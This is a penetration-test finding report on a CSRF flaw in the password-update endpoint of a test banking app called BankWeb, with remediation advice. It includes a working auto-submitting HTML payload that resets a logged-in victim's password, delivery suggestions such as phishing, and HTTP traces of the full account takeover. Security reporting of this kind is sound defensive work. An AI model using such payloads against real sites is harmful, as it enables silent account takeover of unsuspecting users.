# Issue #22 — Cross-Site Request Forgery (CSRF) on Password Update

| Field         | Details                                                        |
|---------------|----------------------------------------------------------------|
| **Target**    | BankWeb — `http://localhost:1337/api/User/ProfilePasswordUpdate` |
| **Severity**  | High                                                           |
| **CVSS v3.1** | 8.1                                                            |
| **Vector**    |AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N                              |
| **Category**  | CSRF — Cross-Site Request Forgery                       |

---

## Summary

The `/api/User/ProfilePasswordUpdate` endpoint accepts cross-origin `POST` requests without any CSRF token validation. The session cookie is not configured with the `SameSite` attribute, meaning browsers will automatically attach it to requests initiated from any external origin. Combined, these two omissions allow an attacker to craft a malicious webpage that silently resets the password of any authenticated visitor to an attacker-controlled value — without any interaction beyond the victim loading the page.

Full exploitation was confirmed end-to-end in a controlled test: a victim browsing to an attacker-hosted page had their password changed without any visible indication, and subsequent login with the new password succeeded.

This vulnerability compounds directly with Issue #16 (no current password required for password change) — an attacker needs only the victim's session cookie to be present in the browser, which requires no theft or XSS. A background form submission is sufficient.

---

## Steps to Reproduce

1. Ensure the victim is authenticated in their browser (i.e. holds an active `SessionId` cookie).
2. Host the following HTML payload on an attacker-controlled server:

   ```html
   <html>
     <body>
       <form action="http://localhost:1337/api/User/ProfilePasswordUpdate" method="POST">
         <input type="hidden" name="newPassword" value="HACKED" />
       </form>
       <script>
         history.pushState('', '', '/');
         document.forms[0].submit();
       </script>
     </body>
   </html>
   ```

3. Deliver the URL to the victim (e.g. via phishing, an embedded link, or an injected resource on a page they visit).
4. Observe that the victim's browser automatically submits a `POST` request to the target application, including their session cookie.
5. Observe that the server responds with `HTTP 200` and `{}`, confirming the password was changed.
6. Confirm the account is now accessible using the attacker-set password.

---

## Proof of Concept

### Stage 1 — Victim Loads Malicious Page

The attacker hosts `csrf.html` on an external server. When the victim browses to it, the page auto-submits a hidden form:

**Victim browser request to attacker server:**

```http
GET /csrf.html HTTP/1.1
Host: [REDACTED-ATTACKER-HOST]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
```

**Attacker server response:**

```http
HTTP/1.0 200 OK
Content-type: text/html

<html>
  <body>
    <form action="http://localhost:1337/api/User/ProfilePasswordUpdate" method="POST">
      <input type="hidden" name="newPassword" value="HACKED"/>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

### Stage 2 — Browser Auto-Submits Cross-Origin Request

The page JavaScript immediately submits the form. The browser attaches the victim's session cookie automatically because no `SameSite` restriction is set:

```http
POST /api/User/ProfilePasswordUpdate HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://[REDACTED-ATTACKER-HOST]
Referer: http://[REDACTED-ATTACKER-HOST]/
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Cookie: SessionId=[REDACTED]

newPassword=HACKED
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Tue, 22 Jul 2025 12:59:39 GMT
Server: Kestrel
Content-Length: 2

{}
```

The server accepted the cross-origin request and changed the password. Note the `Origin: http://[REDACTED-ATTACKER-HOST]` header — the server performed no origin validation.

---

### Stage 3 — Account Takeover Confirmed

Login with the attacker-set password succeeds, confirming full account takeover:

```http
POST /api/Auth/Login HTTP/1.1
Host: localhost:1337
Content-Type: application/json

{"UserName":"[REDACTED]","Password":"HACKED"}
```

```http
HTTP/1.1 200 OK
Set-Cookie: SessionId=[REDACTED-NEW-SESSION]; expires=Wed, 23 Jul 2025 13:10:01 GMT; path=/

{"userName":"[REDACTED]","status":"ok",...}
```

The server issued a new authenticated session, confirming the password was successfully changed via the cross-site request.

> **Note:** The attacker-controlled hostname, all session cookies, and the victim's account identifier have been redacted throughout.

---

## Impact

- **Zero-interaction account takeover** — the victim needs only to visit a single attacker-controlled page while authenticated. No phishing of credentials, no XSS execution, and no user interaction beyond the page load is required. The attack completes silently in the background.
- **Compounded by Issue #16** — the password change endpoint requires no current password verification (Issue #16), meaning the CSRF request does not need to know the victim's existing credentials. The two vulnerabilities together reduce the attack to a single HTTP request issued by the victim's browser.
- **`SameSite` not configured** — modern browsers apply `SameSite=Lax` by default for cookies without an explicit attribute, which would block cross-site `POST` requests via form submissions in most cases. The absence of any `SameSite` attribute on the `SessionId` cookie may indicate the application relies on older browser behaviour, and the attack was confirmed successful in testing, suggesting the default protection was not sufficient in this context.
- **Admin account targeting** — in a banking application, delivering a CSRF payload via a phishing email to an admin user would silently reset their password, enabling the attacker to log in as admin without any further exploitation. Combined with Issue #20 (vertical privilege escalation), this creates a reliable, low-sophistication path to full admin access.
- **No user notification** — as noted in Issue #16, the application does not appear to send a password change notification email. The legitimate user remains unaware of the compromise until they attempt to log in and find their credentials no longer work.

---

## Recommended Mitigations

1. **Implement CSRF token validation on all state-modifying endpoints.** ASP.NET Core provides built-in antiforgery token support — enforce it on `ProfilePasswordUpdate` and all other `POST` endpoints that perform sensitive actions:

   ```csharp
   [HttpPost("ProfilePasswordUpdate")]
   [Authorize]
   [ValidateAntiForgeryToken]
   public async Task<IActionResult> UpdatePassword([FromForm] PasswordUpdateRequest request)
   { ... }
   ```

   Note: ASP.NET Core's antiforgery tokens are already present on some forms in this application (observed on `/Transaction/Create`). The same mechanism should be applied consistently to all sensitive endpoints.

2. **Set `SameSite=Strict` on the session cookie** to instruct browsers to never attach the cookie to cross-site requests:

   ```csharp
   options.Cookie.SameSite = SameSiteMode.Strict;
   ```

   At minimum, `SameSite=Lax` should be used — `SameSite=None` or no attribute should never be used for a session cookie without a specific, justified reason.

3. **Require the current password for password changes** (see Issue #16). This would not prevent the CSRF request from being submitted, but would ensure the attacker needs to know the victim's current credentials — significantly raising the bar even if CSRF protection is absent.

4. **Validate the `Origin` and `Referer` headers** as a secondary CSRF defence. Requests to sensitive endpoints originating from unexpected external domains should be rejected:

   ```csharp
   var origin = Request.Headers["Origin"].ToString();
   if (!string.IsNullOrEmpty(origin) && origin != "https://bankweb.example.com")
       return Forbid();
   ```

5. **Send an immediate out-of-band notification** to the account holder's registered email address on any password change, providing an opportunity to detect and respond to unauthorised changes.